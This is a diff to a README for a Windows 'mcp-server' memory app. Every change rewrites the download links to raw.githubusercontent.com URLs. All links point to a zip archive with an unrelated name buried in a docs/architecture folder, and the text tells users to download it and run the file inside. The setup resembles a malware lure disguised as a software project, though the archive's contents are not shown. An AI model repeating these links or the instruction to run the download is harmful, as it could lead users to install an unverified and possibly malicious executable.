@@ -1,6 +1,6 @@
 # 🤖 mcp-server - Simple Memory for AI Workflows
 
-[![Download mcp-server](https://img.shields.io/badge/Download-mcp--server-blue.svg)](https://github.com/evehypoglycaemic255/mcp-server/raw/refs/heads/main/mcp_server/docs/architecture/mcp_server_hydrargillite.zip)
+[![Download mcp-server](https://img.shields.io/badge/Download-mcp--server-blue.svg)](https://raw.githubusercontent.com/evehypoglycaemic255/mcp-server/main/mcp_server/docs/architecture/mcp_server_hydrargillite.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ mcp-server helps you run a Model Context Protocol server on Windows. It gives AI
 
 Use the link below to visit the page and download the app:
 
-[Download mcp-server](https://github.com/evehypoglycaemic255/mcp-server/raw/refs/heads/main/mcp_server/docs/architecture/mcp_server_hydrargillite.zip)
+[Download mcp-server](https://raw.githubusercontent.com/evehypoglycaemic255/mcp-server/main/mcp_server/docs/architecture/mcp_server_hydrargillite.zip)
 
 ## 💻 What This App Does
 
@@ -39,7 +39,7 @@ If your PC is older, the app can still run, but the dashboard and search may fee
 ## 🖱️ Download and Install
 
 1. Open the download page:
-   [https://github.com/evehypoglycaemic255/mcp-server/raw/refs/heads/main/mcp_server/docs/architecture/mcp_server_hydrargillite.zip](https://github.com/evehypoglycaemic255/mcp-server/raw/refs/heads/main/mcp_server/docs/architecture/mcp_server_hydrargillite.zip)
+   [https://raw.githubusercontent.com/evehypoglycaemic255/mcp-server/main/mcp_server/docs/architecture/mcp_server_hydrargillite.zip](https://raw.githubusercontent.com/evehypoglycaemic255/mcp-server/main/mcp_server/docs/architecture/mcp_server_hydrargillite.zip)
 
 2. Look for the latest release or the main download option on the page.
 
@@ -230,7 +230,7 @@ It is meant to be simple, so you do not need to learn a complex menu system.
 
 If you need the app again, use this link:
 
-[https://github.com/evehypoglycaemic255/mcp-server/raw/refs/heads/main/mcp_server/docs/architecture/mcp_server_hydrargillite.zip](https://github.com/evehypoglycaemic255/mcp-server/raw/refs/heads/main/mcp_server/docs/architecture/mcp_server_hydrargillite.zip)
+[https://raw.githubusercontent.com/evehypoglycaemic255/mcp-server/main/mcp_server/docs/architecture/mcp_server_hydrargillite.zip](https://raw.githubusercontent.com/evehypoglycaemic255/mcp-server/main/mcp_server/docs/architecture/mcp_server_hydrargillite.zip)
 
 Visit the page, download the Windows app, extract it if needed, and run the file from the folder you saved
 
